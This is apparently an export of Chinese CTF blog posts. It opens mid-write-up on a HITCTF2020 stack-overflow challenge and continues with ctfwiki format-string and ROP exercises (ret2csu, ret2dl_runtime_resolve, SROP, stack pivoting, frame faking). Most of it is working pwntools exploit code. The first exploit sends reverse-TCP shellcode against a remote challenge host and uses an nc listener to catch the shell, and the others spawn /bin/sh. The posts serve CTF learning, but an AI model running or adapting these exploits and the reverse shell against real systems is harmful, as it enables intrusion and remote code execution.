fclose(stdout);\n  fclose(stderr);\n  return 0;\n}\n```\n\n可以看到scanf时有个栈溢出，溢出可以覆盖main函数返回地址，那么这就控制了eip。\n\n# 2 利用\n\n这个题控制eip很简单，但是怎么get shell呢？\n\n```\n1、到这里，我首先想到的是之前ctfwiki里的stack pivoting方法。想把shellcode布置在栈上，然后直接jmp rsp。但是无奈使用ROPgadget并没有找到“jmp rsp”这条指令，其他的看了看想了想也都不可行。所以只能放弃了。\nbling@bling:~/Desktop$ ROPgadget --binary dagongren1 --only \"jmp|ret\"\nGadgets information\n============================================================\n0x00000000004006bb : jmp 0x400650\n0x0000000000400803 : jmp 0x40087a\n0x000000000040098b : jmp qword ptr [rbp]\n0x000000000040094b : jmp qword ptr [rcx]\n0x0000000000400635 : jmp rax\n0x0000000000400581 : ret\n\n2、然后，我又想通过泄露libc来执行system或execve，但是由于源码中有“fclose(stdout);”，使得程序的标准输出被关了，于是我不可能泄露出libc。最后也只能放弃该想法。\n```\n\n最后，在王老师的提示下，知道.bss段末尾在进程空间中有一段是可写的（要写到extern后面哦），加上该题程序未开启NX，因此这段还可以执行。所以就依靠ROP+栈迁移吧！\n\n## 2.1 迁移rbp\n\n迁移到哪里呢？一开始试了下迁移到0x600cf0，但是scanf的时候会在0x0c处截断，试了半天最后选择了0x600f0f。\n\nmain函数结尾处:\n\n```assembly\n.text:0000000000400735                 leave\n.text:0000000000400736                 retn\n```\n\n相当于：\n\n```assembly\nmov esp,ebp\npop ebp\npop rip\n```\n\n因此我们将rbp覆盖为栈迁移目的地址，将rip覆盖为我们想执行的代码。\n\n## 2.2 在新栈中布置shellcode\n\nrbp栈迁移后，我们需要在新的栈空间布置shellcode，因此必定还需要进行依次输入。查看main函数中scanf的上下文，如下：\n\n```assembly\n.text:00000000004006FC                 lea     rax, [rbp+var_20]\n.text:0000000000400700                 mov     rsi, rax\n.text:0000000000400703                 mov     edi, offset aS  ; \"%s\"\n.text:0000000000400708                 mov     eax, 0\n.text:000000000040070D                 call    __isoc99_scanf\n```\n\n0x4006fc处是以rbp进行栈空间寻址的，因此在我们迁移完rbp后就可以立马进行下一次scanf输入了。构造过程如下图所示：\n\n```\n         栈空间\n\n         +---------------+\n         |               |\n         |               |                       .bss段\n         +---------------+\n         |               |                       +---------------+\n         +---------------+                       |               |\nret_addr |   0x4006fc    |                       |               |\n         +---------------+                       |               |\nold_rbp  |   0x600f0f    +----------+            |               |\n         +---------------+ v4+0x20  |            |               |\n         |               |          |            |               |\n         |               |          |            |               |\n         |               |          |            |               |\n         |               |          |            |               |\n         |    padding    |          |            |               |\n         |               |          |            |               |\n         |               |          |            |               |\n         |               |          |            +---------------+\n         |               |          |            |               |\n         |               |          +----------> +---------------+ 0x600f0f\n         |               |                       |               |\n         +---------------+                       |               |\n         |               |                       |               |\n         +---------------+ v4                    +---------------+\n\n```\n\n## 2.3 控制eip执行shellcode\n\n上一步骤中，scanf输入完毕后，main函数会继续执行到最后的`leave;ret;`，这里可以再次控制eip。需要提前布置好新栈中的数据。\n\n因为是同一个main函数的栈，所以新栈的结构跟之前栈结构是一样的。这里需要将ret_addr处的地址改成shellcode的地址，这样main函数中执行到ret的时候就可以控制执行流了。\n\n```\n         栈空间\n\n         +---------------+\n         |               |\n         |               |                       .bss段\n         +---------------+\n         |               |                       +---------------+\n         +---------------+                       |               |\nret_addr |   0x4006fc    |                       |               |\n         +---------------+                       |               |\nold_rbp  |   0x600f0f    +----------+            |               |\n         +---------------+ v4+0x20  |            |   shellcode   |\n         |               |          |            |               |\n         |               |          |            |               |\n         |               |          |            +---------------+\n         |               |          |   ret_addr |     addr      |\n         |    padding    |          |            +---------------+\n         |               |          |   old_rbp  |    padding    |\n         |               |          +----------> +---------------+ 0x600f0f\n         |               |                       |               |\n         |               |                       |               |\n         |               |                       |    padding    |\n         |               |                       |               |\n         +---------------+                       |               |\n         |               |                       |               |\n         +---------------+ v4                    +---------------+ 0x600f0f-0x20\n```\n\n## 2.4 shellcode的选择\n\nshellcode有一个官方网站：[shell-storm](http://shell-storm.org/shellcode/)\n\n由于程序源码中有“fclose(stdout);”的限制，无法通过普通shellcode拿到shell。这大概是这道题对我来说最难的一部分了。对网络真的一窍不通o(╥﹏╥)o\n\n为了绕过这一限制，最后使用了[Reverse TCP shell](http://shell-storm.org/shellcode/files/shellcode-857.php)这个shellcode，“反连TCP”的方法。\n\n参考这篇文章大概了解了一下“反连TCP”这是个啥：[metasploit中Payload的reverse_tcp和bind_tcp的区别](https://blog.csdn.net/adidala/article/details/24117711)。\n\n大概意思就是 说呢，reverse_tcp的方法需要我们在一台攻击服务器上打开一个监听端口（使用nc），payload在受害者机器上执行的时候，根据ip地址和端口来连接该攻击服务器，将信息传送给攻击者。而bind_tcp是指在受害者机器上开一个端口，然后攻击者连过去，如果受害者机器开了防火墙，这种方法就不会成功。因此，大多数时候我们都使用reverse_tcp。\n\n参考[nc工具使用](https://www.cnblogs.com/zhaijiahui/p/9028402.html)，附加一个nc/telnet实现服务端/客户端连接的例子。\n\n```shell\n#服务端\n#需要设置好监听端口的防火墙规则，否则其他机器无法建立连接\nnc -p 33x -l -vv\n#客户端\ntelnet 1xx.1xx.xx.xxx 33x\n```\n\n# 3 EXP\n\n```python\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\n\nmyelf = ELF('./dagongren1')\n# 本地调试\n# myproc = process(myelf.path)\n# 打远程\nmyproc = remote(\"81.70.209.171\",51601)\n\nafter_bss = 0x600f0f\nscanf_gdt = 0x4006fc\n\npayload1 = 'c' * 0x20\npayload1 += p64(after_bss)\npayload1 += p64(scanf_gdt)\n\n# port - 33x,ip - 14x.12x.5x.1x\n# 这里需要换成自己服务器的地址和ip哦，记得对应端口设置防火墙规则\n# PORT端口号对应的十六进制\nPORT = '\\x8x\\x4x'\n# IPADDR对应的十六进制，通过'.'号分隔\nIPADDR = '\\x33\\x33\\x33\\x33'\nshellcode = \"\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2\\x4d\\x31\\xc0\\x6a\"\nshellcode += \"\\x02\\x5f\\x6a\\x01\\x5e\\x6a\\x06\\x5a\\x6a\\x29\\x58\\x0f\\x05\\x49\\x89\\xc0\"\nshellcode += \"\\x48\\x31\\xf6\\x4d\\x31\\xd2\\x41\\x52\\xc6\\x04\\x24\\x02\\x66\\xc7\\x44\\x24\"\nshellcode += \"\\x02\"+ PORT + \"\\xc7\\x44\\x24\\x04\" + IPADDR + \"\\x48\\x89\\xe6\\x6a\\x10\"\nshellcode += \"\\x5a\\x41\\x50\\x5f\\x6a\\x2a\\x58\\x0f\\x05\\x48\\x31\\xf6\\x6a\\x03\\x5e\\x48\"\nshellcode += \"\\xff\\xce\\x6a\\x21\\x58\\x0f\\x05\\x75\\xf6\\x48\\x31\\xff\\x57\\x57\\x5e\\x5a\"\nshellcode += \"\\x48\\xbf\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xef\\x08\\x57\\x54\"\nshellcode += \"\\x5f\\x6a\\x3b\\x58\\x0f\\x05\"\n\npayload2 = 'a'*0x20\npayload2 += 'bbbbbbbb'\npayload2 += p64(after_bss + 0x10)\npayload2 += shellcode\n\nmyproc.recvuntil(\"Come On\")\n# break at main -> leave;ret;\n# gdb.attach(myproc,\"b *0x400735\")\nmyproc.sendline(payload1)\nmyproc.sendline(payload2)\n\nmyproc.interactive()\n```\n\n结果：\n\n- 服务端\n\n```shell\nroot@iZt4n6o5h5zjwhe2ubl2uqZ:~# nc -p 33x -l -vv\nListening on [0.0.0.0] (family 0, port 33x)\nConnection from 81.70.209.171 51786 received!\nls\nbin\ndev\nflag\nlib\nlib32\nlib64\nlibx32\npwn\ncat flag\n\nHITCTF2020{4957306aaa6ff77d77c310f5379addf7}\n```\n\n- 本地\n\n```shell\nbling@bling:~/Desktop$ python poc.py \n[DEBUG] PLT 0x4005a0 puts\n[DEBUG] PLT 0x4005a8 fclose\n[DEBUG] PLT 0x4005b0 alarm\n[DEBUG] PLT 0x4005b8 __libc_start_main\n[DEBUG] PLT 0x4005c0 __gmon_start__\n[DEBUG] PLT 0x4005c8 setvbuf\n[DEBUG] PLT 0x4005d0 __isoc99_scanf\n[*] '/home/bling/Desktop/dagongren1'\n    Arch:     amd64-64-little\n    RELRO:    No RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      No PIE (0x400000)\n    RWX:      Has RWX segments\n[+] Opening connection to 81.70.209.171 on port 51601: Done\n[DEBUG] Received 0x13 bytes:\n    'Good morning master'\n[DEBUG] Received 0x3c bytes:\n    00000000  0a 57 6f 72  6b 20 68 61  72 64 20 66  6f 72 20 79  │·Wor│k ha│rd f│or y│\n    00000010  6f 75 72 20  62 6f 73 73  20 74 6f 20  6c 69 76 65  │our │boss│ to │live│\n    00000020  20 61 20 62  65 74 74 65  72 20 6c 69  66 65 21 f0  │ a b│ette│r li│fe!·│\n    00000030  9f 91 80 0a  43 6f 6d 65  20 4f 6e 0a               │····│Come│ On·│\n    0000003c\n[DEBUG] Sent 0x31 bytes:\n    00000000  63 63 63 63  63 63 63 63  63 63 63 63  63 63 63 63  │cccc│cccc│cccc│cccc│\n    *\n    00000020  0f 0f 60 00  00 00 00 00  fc 06 40 00  00 00 00 00  │··`·│····│··@·│····│\n    00000030  0a                                                  │·│\n    00000031\n[DEBUG] Sent 0xa7 bytes:\n    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│\n    *\n    00000020  62 62 62 62  62 62 62 62  1f 0f 60 00  00 00 00 00  │bbbb│bbbb│··`·│····│\n    00000030  48 31 c0 48  31 ff 48 31  f6 48 31 d2  4d 31 c0 6a  │H1·H│1·H1│·H1·│M1·j│\n    00000040  02 5f 6a 01  5e 6a 06 5a  6a 29 58 0f  05 49 89 c0  │·_j·│^j·Z│j)X·│·I··│\n    00000050  48 31 f6 4d  31 d2 41 52  c6 04 24 02  66 c7 44 24  │H1·M│1·AR│··$·│f·D$│\n    00000060  02 8x 4x c7  44 24 04 9x  8x 3x 8x 48  89 e6 6a 10  │··K·│D$··│·3·H│··j·│\n    00000070  5a 41 50 5f  6a 2a 58 0f  05 48 31 f6  6a 03 5e 48  │ZAP_│j*X·│·H1·│j·^H│\n    00000080  ff ce 6a 21  58 0f 05 75  f6 48 31 ff  57 57 5e 5a  │··j!│X··u│·H1·│WW^Z│\n    00000090  48 bf 2f 2f  62 69 6e 2f  73 68 48 c1  ef 08 57 54  │H·//│bin/│shH·│··WT│\n    000000a0  5f 6a 3b 58  0f 05 0a                               │_j;X│···│\n    000000a7\n[*] Switching to interactive mode\n\n[*] Got EOF while reading in interactive\n$  \n```","categories":["CTF"]},{"title":"ctfwiki format string 练习","url":"/2020/11/01/ctfwiki-format-string/","content":"\n# hijack GOT\n\n本题是2016 CCTF 中的pwn3\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('./pwn3')\nmyproc = process(myelf.path)\n\ndef get_1(name):\n    myproc.recvuntil('ftp>')\n    myproc.sendline('get')\n    myproc.recvuntil('get:')\n    myproc.sendline(name)\n    data = myproc.recv()\n    return data\n\ndef put_2(name,content):\n    myproc.recvuntil('ftp>')\n    myproc.sendline('put')\n    myproc.recvuntil('upload:')\n    myproc.sendline(name)\n    myproc.recvuntil('the content:')\n    myproc.sendline(content)\n\ndef dir_3():\n    myproc.recvuntil('ftp>')\n    myproc.sendline('dir')\n\nmyproc.recvuntil('Rainism):')\nmyproc.sendline('rxraclhm')\n\nputs_got = myelf.got['puts']\nlog.warn('#####puts_got addr: 0x%x#####' % puts_got)\ninput1 = '%8$s' + p32(puts_got) + '%7$x'\nput_2('aaaa',input1)\n###\n###gdb.attach(myproc,\"b printf\")\n###\nputs_addr = u32(get_1('aaaa')[:4])\n\nlog.warn('#####puts addr: 0x%x#####' % puts_addr)\n\nputs_libc_offset = 0x5f150\nsys_libc_offset = 0x3a950\n\nlibc_base = puts_addr - puts_libc_offset\nsys_addr = libc_base + sys_libc_offset\n\nlog.warn('#####libc_base addr: 0x%x#####' % libc_base)\nlog.warn('#####sys_addr addr: 0x%x#####' % sys_addr)\n##\npayload = fmtstr_payload(7, {puts_got: sys_addr})\n\nmyproc.sendline('put')\nmyproc.recvuntil('upload:')\nmyproc.sendline(\"/bin/sh;\")\nmyproc.recvuntil('the content:')\nmyproc.sendline(payload)\n\nget_1('/bin/sh;')\n\nmyproc.sendline('dir')\n\nmyproc.interactive()\n```\n\n# hijack retaddr\n\n本题是三个白帽的pwnme_k0\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch='amd64',os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./pwnme_k0\")\nmyproc = process(myelf.path)\n\nmyproc.recvuntil(\"Input your username(max lenth:20): \")\nmyproc.sendline(\"name\")\nmyproc.recvuntil(\"Input your password(max lenth:20): \")\npasswd = '%6$p'\nmyproc.sendline(passwd)\n\n##\n##gdb.attach(myproc,\"b *0x400b39\")\n##\nmyproc.recvuntil('>')\nmyproc.sendline(str(1))\nmyproc.recvuntil(\"0x\")\n\ndata = myproc.recvline().strip()\nstack_addr = int(data,16)\nret_stack = stack_addr - 0x38\n\n##将栈上的返回地址覆盖成提权gadget\nmyproc.recvuntil('>')\nmyproc.sendline(str(2))\nmyproc.recvuntil(\"please input new username(max lenth:20): \")\nmyproc.sendline(p64(ret_stack))\nmyproc.recvuntil(\"please input new password(max lenth:20): \")\nmyproc.sendline(\"%2218c%8$hn\")\n\n##\nmyproc.recvuntil('>')\nmyproc.sendline(str(1))\n\nmyproc.interactive()\n```\n\n# 堆上的格式化字符串漏洞\n\n 本题是2015年CSAW中的 contacts\n\n（这个题还没调完，后来有别的事去了，先放一下）\n\n```python\n#coding=utf-8\nfrom pwn import *\n\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('./contacts')\nmyproc = process(myelf.path)\n\ndef Create(c_name,c_phone,c_len,c_desp):\n    myproc.recvuntil('>>> ')\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"Contact info: \")\n    myproc.recvuntil(\"\\tName: \")\n    myproc.sendline(c_name)\n    myproc.recvuntil(\"\\tEnter Phone No: \")\n    myproc.sendline(c_phone)\n    myproc.recvuntil(\"\\tLength of description: \")\n    myproc.sendline(c_len)\n    myproc.recvuntil(\"\\tEnter description:\\n\\t\\t\")\n    myproc.sendline(c_desp)\n\ndef Display():\n    myproc.recvuntil('>>> ')\n    myproc.sendline(str(4))\n    myproc.recvuntil(\"\\tDescription: \")\n\nCreate('aaaaaaaa','1234567891',str(50),'%31$paaaa')\n\nDisplay()\ndata = myproc.recvuntil('aaaa',drop=True)\nlibc_start_main = int(data,16) - 247\nlog.warn(\"a: 0x%x\" % libc_start_main)\nlibc_base = libc_start_main - 0x18550\nlog.warn(\"b: 0x%x\" % libc_base)\nsys_addr = libc_base + 0x3a950\nbinsh_addr = libc_base + 0x15910b\n\n\npayload = flat([sys_addr,'aaaa',binsh_addr,'%6$p%11$pbbbb'])\ngdb.attach(myproc,\"b *0x08048c22\")\nCreate('xxxxxxxx','2342342234',str(50),payload)\nDisplay()\nmyproc.recvuntil(\"\\tDescription: \")\ndata = myproc.recvuntil('bbbb',drop=True)\ndata = data.split('0x')\nprint data\nebp_addr = int(data[1],16)\nheap_addr = int(data[2],16)\n\n#payoad = '%'+str(ebp_addr-4)+'x'+'%6$n'\n#part1 = (ebp_addr-4)/2\n#part2 = ebp_addr-4 -part1\n#payload = '%'+str(part1)+'x%'+str(part2)+'x%6$n'\n\npayload = fmtstr_payload(6,{ebp_addr:heap_addr})\nprint payload\n\nCreate('eeeeeeee','1231231231',str(400),payload)\nDisplay()\n\nmyproc.interactive()\n      +------------+\n      |  tag 0/1   |\n      +------------+v2+76\n      |len of desp |\n      +------------+v2+72\n      |            |\n      |            |\n      |            |\n      |            |\n      |            |\n      |            |\n      |            |\n      |            |\n      |            |\n      |            |\n      |            |\n      |            |\n      |            |\n      |            |\n      |   Name     |\n      +------------+ v2+8                     +---------+\n      |   &heap1   |           +--------+     |         |\n      +------------+ v2+4      |  Phone |     |  desp   |\n      |   &heap2   |           |        |     |         |\n      +------------+ v2        +--------+     +---------+\n0x804b0a0                        heap1          heap2\n\n0x804b088   record num\n```\n\n参考wp：\n\nhttp://geeksspeak.github.io/blog/2015/09/21/csaw-2015-pwn250-contacts/\n\nhttps://blog.osiris.cyber.nyu.edu/2015/09/28/csaw-ctf-contacts/\n\nhttps://github.com/osirislab/CTF-Solutions/blob/master/CSAWCTF_2015/2015-10-03-csaw-ctf-contacts.markdown","categories":["CTF"]},{"title":"ctfwiki rop练习","url":"/2020/10/18/ctfwiki-rop/","content":"\n> 部门要准备十一月份的比赛，我也跟着报了个名。虽然自己的pwn现在还很水，但是想着趁这个机会督促自己一把，花点时间好好练一些题。平时除了练题，还有其他工作上的事要做，所以这个只是简单地把我做过的题目的write up做了个罗列，还木有时间写详细的分析过程啦。不过想想，除了自己可能也没谁会来看，等以后有时间（呵呵呵）了再回过头来整理吧~\n\n# 中级ROP\n\n## 题目1 ret2csu\n\nret2csu主要是利用__libsc_csu_init()函数中的gadget，如下代码片段：\n\n```assembly\n.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54↓j\n.text:0000000000400600                 mov     rdx, r13\n.text:0000000000400603                 mov     rsi, r14\n.text:0000000000400606                 mov     edi, r15d\n.text:0000000000400609                 call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]\n.text:000000000040060D                 add     rbx, 1\n.text:0000000000400611                 cmp     rbx, rbp\n.text:0000000000400614                 jnz     short loc_400600\n.text:0000000000400616\n.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34↑j\n.text:0000000000400616                 add     rsp, 8\n.text:000000000040061A                 pop     rbx\n.text:000000000040061B                 pop     rbp\n.text:000000000040061C                 pop     r12\n.text:000000000040061E                 pop     r13\n.text:0000000000400620                 pop     r14\n.text:0000000000400622                 pop     r15\n.text:0000000000400624                 retn\n```\n\n将0x40061a至0x400624命名为“片段1”，0x400600至0x400614命名为“片段2”。利用ret2csu时，首先将eip劫持到“片段1”，并通过在栈上提前布置rbx，rbp，r12，r13，r14，r15，达到控制寄存器的目的，再利用片段1中的额retn使程序流转到片段2去执行。片段2中会将r13，r14，r15（低32位）分别用于控制rdx，rsi，edi，如此便能控制64位下的前三个函数参数。紧接着有一条call指令，只要提前将r12控制为目标函数（目标函数地址存放的地址），并将rbx置为0，就可以实现任意函数执行了。后面还有个cmp（提前将rbx设置为0，rbp设置为1）以及一些列pop，提前构造好后，程序会再次运行到最后一行0x400624，此时还可以劫持一次eip，让程序继续执行（如回到main函数）。\n\n这里使用的示例程序是[level5](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5)，分析后，构造的第一次ret2csu状态如下。执行完csu_front（上文中的片段2）后，会继续执行片段1，为了控制最后一行0x400624 retn时的eip，需要在栈上填充0x38字节数据（为了安全执行完0x400616至0x400622之间的代码）。\n\n```\n+--------------------+\n|     csu_front:0x400600\n+--------------------+\n|      r15           |  1\n+--------------------+\n|      r14           |  got_write\n+--------------------+\n|      r13           |  8\n+--------------------+\n|      r12           |  got_write\n+--------------------+\n|      rbp           |  1\n+--------------------+\n|      rbx           |  0\n+--------------------+\n|      ret addr      |  csu_end:0x40061a\n+--------------------+\n|       ebp          |  'aaaaaaaa'\n+--------------------+\n|                    |\n|      'a'*0x80      |\n|                    |\n+--------------------+  buf\n\n```\n\n该题exp如下，用到的libc是我本地ubuntu18.04的：\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./level5\")\nmyproc = process(myelf.path)\n\ncsu_front = 0x400600\ncsu_end = 0x40061a\n\ngot_write = myelf.got['write']\ngot_read = myelf.got['read']\nbss_addr = myelf.bss()\nmain_addr = myelf.symbols['main']\n\ndef ret2csu(rbx,rbp,r12,r13,r14,r15,next_addr):\n    payload = 'a'*0x80  # patch\n    payload += 'deadbeef'   # overwrite ebp\n    payload += p64(csu_end) # overwrite return addr, jump to csu_end\n    payload += p64(rbx)          # set rbx to r15\n    payload += p64(rbp)\n    payload += p64(r12)\n    payload += p64(r13)\n    payload += p64(r14)\n    payload += p64(r15)\n    payload += p64(csu_front)    # jump to csu_front,and exec r12\n    payload += 'a'*0x38     # 2nd csu_end,and jump to next eip\n    payload += p64(next_addr)\n    myproc.send(payload)\n    \n# write(1,got_write,8)\nmyproc.recvuntil(\"Hello, World\\n\")\nret2csu(0,1,got_write,8,got_write,1,main_addr)\nwrite_addr = u64(myproc.recv(8))\n\n# read(0,bss_addr,20)\nmyproc.recvuntil(\"Hello, World\\n\")\nret2csu(0,1,got_read,20,bss_addr,0,main_addr)\n \n# input: p64(exec_addr)+'/bin/sh\\x00'\nlibc_base = write_addr - 0x110250\nexec_addr = libc_base + 0xe4e90\nbss_data = p64(exec_addr) + \"/bin/sh\\x00\"\nmyproc.send(bss_data)\n\n# execve(\"/bin/sh\",null,null)\nmyproc.recvuntil(\"Hello, World\\n\")\nret2csu(0,1,bss_addr,0,0,bss_addr+8,main_addr)\n\n#gdb.attach(myproc)\n#log.warn(\"write addr is : 0x%x\" % write_addr)\nmyproc.interactive()\n```\n\n## 题目2 ret2reg\n\n## 题目3 BROP\n\n\n\n# 高级 ROP\n\n## 题目1 ret2_dl_runtime_resolve\n\n_dl_runtime_resolve: https://www.jianshu.com/p/57f6474fe4c6\n\n深入了解GOT,PLT和动态链接: https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html\n\n以上结合https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/ 可以写一篇笔记记录一下。免得以后忘记。\n\n练习题目我的wp：\n\n```python\n#coding=utf-8\nfrom pwn import *\n\ncontext(arch=\"i386\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./main\")\nmyrop = ROP(\"./main\")\nmyproc = process(myelf.path)\n\nbss_addr = myelf.bss()\nnew_esp = bss_addr + 0x500\n\nmyrop.raw('a'*112)\nmyrop.read(0,new_esp,100)\nmyrop.migrate(new_esp)\n#log.warn(\"myrop is : %s\" % myrop.dump())\n\nmyproc.recvuntil(\"Welcome to XDCTF2015~!\\n\")\nmyproc.sendline(myrop.chain())\n\n#myrop2 = ROP(\"./main\")\n#sh = \"/bin/sh\"\n#myrop2.write(1,new_esp+80,len(sh))\n#myrop2.raw('b'*(80 - len(myrop2.chain())))\n#myrop2.raw(sh)\n#myrop2.raw('a'*(100 - len(myrop2.chain())))\n##log.warn(\"myrop is : %s\" % myrop2.dump())\n#myproc.sendline(myrop2.chain())\n#myproc.interactive()\n\n#myrop2 = ROP(\"./main\")\n#sh =\"/bin/sh\"\n#plt_addr = myelf.get_section_by_name('.plt').header.sh_addr\n#write_index = (myelf.plt['write'] - plt_addr)/16 -1\n#patch_wt_ret = 'aaaa'\n#myrop2.raw(plt_addr)\n#myrop2.raw(write_index*8)\n#myrop2.raw(patch_wt_ret)\n#myrop2.raw(1)\n#myrop2.raw(new_esp+80)\n#myrop2.raw(len(sh))\n#myrop2.raw('b'*(80 - len(myrop2.chain())))\n#myrop2.raw(sh)\n#myrop2.raw('b'*(100 - len(myrop2.chain())))\n#\n#myproc.sendline(myrop2.chain())\n#myproc.interactive()\n#\n\nmyrop2 = ROP('./main')\nsh = \"/bin/sh\"\nplt_addr = myelf.get_section_by_name('.plt').header.sh_addr\nrel_plt = myelf.get_section_by_name('.rel.plt').header.sh_addr\n\nwrite_got = myelf.got['write']\nr_info = 0x607\n\nfake_index = new_esp + 24 - rel_plt\n\nmyrop2.raw(plt_addr)\nmyrop2.raw(fake_index)\nmyrop2.raw('aaaa')\nmyrop2.raw(1)\nmyrop2.raw(new_esp+80)\nmyrop2.raw(len(sh))\nmyrop2.raw(write_got)\nmyrop2.raw(r_info)\nmyrop2.raw('b'*(80-len(myrop2.chain())))\nmyrop2.raw(sh)\nmyrop2.raw('b'*(100-len(myrop2.chain())))\nmyproc.sendline(myrop2.chain())\nmyproc.interactive()\n```\n\n\n\n## 题目2 SROP\n\nhttps://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop\n\n拓展：https://bbs.pediy.com/thread-258047.htm\n\n练习题目我的wp：\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./smallest\")\nmyproc = process(myelf.path)\n\nret_start = 0x4000b0\nret_syscall = 0x4000be\n\n# read(0,&rsp,0x400); read(1,&rsp,0x400)\npayload1 = p64(ret_start)*3\nmyproc.send(payload1)\nmyproc.send('\\xb3')\nstack_addr = u64(myproc.recv()[8:16])\nlog.warn(\"stack_addr is: 0x%x\" % stack_addr)\n\n#read(0,&rsp,0x400)\nsigframe = SigreturnFrame()\nsigframe.rax = constants.SYS_read\nsigframe.rip = ret_syscall\nsigframe.rdi = 0\nsigframe.rsi = stack_addr\nsigframe.rdx = 0x400\nsigframe.rsp = stack_addr\n\npayload1 = p64(ret_start) + 'a'*8 + str(sigframe)\npayload2 = p64(ret_syscall) + 'a'*7\nmyproc.send(payload1)\nmyproc.send(payload2)\n\n# new stack - we know the addr\nsigframe = SigreturnFrame()\nsigframe.rax = constants.SYS_execve\nsigframe.rip = ret_syscall\nsigframe.rdi = stack_addr + 0x150\nsigframe.rsi = 0x0\nsigframe.rdx = 0x0\nsigframe.rsp = stack_addr\n\npayload1 = p64(ret_start) + 'a'*8 + str(sigframe)\n#log.warn(\"len: 0x%x \" % len(payload1))\npayload = payload1 + 'a'*(0x150 - len(payload1)) + \"/bin/sh\\x00\"\n\npayload2 = p64(ret_syscall) + 'a'*7\nmyproc.send(payload)\nmyproc.send(payload2)\n\nmyproc.interactive()\n```\n\n## 题目3 ret2VDSO\n\n\n\n# ROP Tricks\n\n## 题目1 stack pivoting\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\nmyelf = ELF('./b0verfl0w')\nmyproc = process(myelf.path)\n\noffset = 36\n\n#shellcode_x86 = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\"\n#shellcode_x86 += \"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\"\n#shellcode_x86 += \"\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\"\n#shellcode_x86 += \"\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\"\n\nshellcode_x86 = \"\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\"\n\npayload = shellcode_x86 + 'a'*(36- len(shellcode_x86)) + p32(0x08048504)\npayload += asm('sub esp,40;jmp esp') \n\nmyproc.recvuntil(\"What's your name?\")\nmyproc.sendline(payload)\n\nmyproc.interactive()\n```\n\n## 题目2 frame faking\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\nmyelf = ELF('./over.over')\nmyproc = process(myelf.path)\nmylibc = myelf.libc\n\noffset = 0x58\ntotal_len = 0x60\n\n##leak stack\npayload = 'a'*0x50\nmyproc.recvuntil('>')\nmyproc.send(payload)\nprev_rbp = u64(myproc.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))\nlog.warn('recieved: 0x%x' % prev_rbp)\n\n##leak libc,puts(&got_puts)\npop_rdi_ret = 0x400793\nrbp1 = prev_rbp-0x20-0x50\nending = 0x4006be\nleak_libc_chain = 'a'*8+p64(pop_rdi_ret)+p64(myelf.got['puts'])+p64(myelf.plt['puts'])+p64(0x400676)\npayload1 = leak_libc_chain+(0x50-len(leak_libc_chain))*'a'+p64(rbp1)+p64(ending)\nmyproc.recvuntil('>')\nmyproc.send(payload1)\nleak_puts = u64(myproc.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))\nlog.warn('recieved: 0x%x' % leak_puts)\nlog.warn('mylibc.sym: 0x%x' % mylibc.sym['puts'])\nlibc_base = leak_puts - mylibc.sym['puts']\nlog.warn('libc_base: 0x%x' % libc_base)\n\n## get shell,execve(\"/bin/sh\\x00\",null,null)\npop_rdx_rsi_ret = libc_base + 0x115189\nexec_addr = libc_base + mylibc.sym['execve']\nbin_sh = libc_base + next(mylibc.search(\"/bin/sh\"))\nrbp2 = prev_rbp-0x20-0x50-0x30\n\nexec_chain = flat(['a'*8,p64(pop_rdx_rsi_ret),p64(0),p64(0),p64(pop_rdi_ret),p64(bin_sh),p64(exec_addr)])\npayload2 = exec_chain + (0x50-len(exec_chain))*'a' + p64(rbp2) + p64(ending)\nmyproc.recvuntil('>')\nmyproc.send(payload2)\n\n#gdb.attach(myproc)\nmyproc.interactive()\n```\n\n## 题目3 Stack smash\n\n2015年32c3 ctf readme\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf = ELF('./readme.bin')\nmyproc = process(myelf.path)\n\nargv0_addr = 0x7fffffffdda8\nname_addr = 0x7fffffffdb90\nbackup_string = 0x400d21\npayload = 'a'*(argv0_addr-name_addr) + p64(backup_string)\n\nmyproc.recvuntil(\"Hello!\\nWhat's your name? \")\nmyproc.sendline(payload)\nmyproc.recvuntil(\"Please overwrite the flag: 